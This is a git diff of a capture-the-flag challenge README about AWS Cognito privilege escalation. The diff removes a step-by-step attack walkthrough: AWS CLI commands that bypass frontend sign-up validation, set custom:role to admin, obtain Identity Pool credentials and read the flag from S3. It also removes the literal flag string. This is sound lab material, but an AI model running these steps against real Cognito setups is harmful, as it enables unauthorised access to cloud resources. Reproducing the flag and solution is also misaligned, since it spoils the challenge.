@@ -32,77 +32,9 @@ The challenge contains two main vulnerabilities:
                                                └─────────────────┘
 ```
 
-## Attack Flow
+## Challenge Information
 
-### Step 1: Reconnaissance
-- Navigate to the web application
-- Inspect source code to find Cognito configuration
-- Extract User Pool ID, Client ID, and Identity Pool ID
-
-### Step 2: Bypass Registration Validation
-The frontend validates email domains, but this can be bypassed by registering directly via AWS CLI:
-
-```bash
-aws cognito-idp sign-up \
-  --client-id 'CLIENT_ID' \
-  --username 'attacker@example.com' \
-  --password 'SecurePass123!' \
-  --user-attributes '[
-    {"Name":"given_name","Value":"John"},
-    {"Name":"family_name","Value":"Doe"}
-  ]'
-```
-
-### Step 3: Email Verification
-Verify the email address using the confirmation code:
-
-```bash
-aws cognito-idp confirm-sign-up \
-  --client-id 'CLIENT_ID' \
-  --username 'attacker@example.com' \
-  --confirmation-code 'VERIFICATION_CODE'
-```
-
-### Step 4: Login and Extract Tokens
-- Login through the web interface
-- Extract `access_token` and `id_token` from browser localStorage
-- Note the initial `custom:role` attribute is set to `reader`
-
-### Step 5: Privilege Escalation
-Update the custom role attribute to escalate privileges:
-
-```bash
-aws cognito-idp update-user-attributes \
-  --access-token 'ACCESS_TOKEN' \
-  --user-attributes '[{"Name":"custom:role","Value":"admin"}]'
-```
-
-### Step 6: Obtain AWS Credentials
-Get Identity Pool credentials using the updated ID token:
-
-```bash
-# Get Identity ID
-aws cognito-identity get-id \
-  --identity-pool-id 'IDENTITY_POOL_ID' \
-  --logins "cognito-idp.REGION.amazonaws.com/USER_POOL_ID=ID_TOKEN"
-
-# Get AWS credentials
-aws cognito-identity get-credentials-for-identity \
-  --identity-id 'IDENTITY_ID' \
-  --logins "cognito-idp.REGION.amazonaws.com/USER_POOL_ID=ID_TOKEN"
-```
-
-### Step 7: Access the Flag
-Use the obtained AWS credentials to access the S3 bucket containing the flag:
-
-```bash
-export AWS_ACCESS_KEY_ID="OBTAINED_ACCESS_KEY"
-export AWS_SECRET_ACCESS_KEY="OBTAINED_SECRET_KEY"
-export AWS_SESSION_TOKEN="OBTAINED_SESSION_TOKEN"
-
-aws s3 cp s3://FLAG_BUCKET_NAME/flag.txt ./flag.txt
-cat flag.txt
-```
+Participants will receive the web application URL and basic scenario description after deployment. The detailed attack flow and solution steps are available in the `SOLUTION.md` file.
 
 ## Key Learning Points
 
@@ -130,9 +62,9 @@ cat flag.txt
 3. Update the web application with the generated Cognito configuration
 4. Upload web content to the S3 bucket
 
-## Flag
+## Flag Format
 
-`CTF{c0gn1t0_pr1v1l3g3_3sc4l4t10n_vuln3r4b1l1ty}`
+The flag follows the standard CTF format.
 
 ## Resources
 
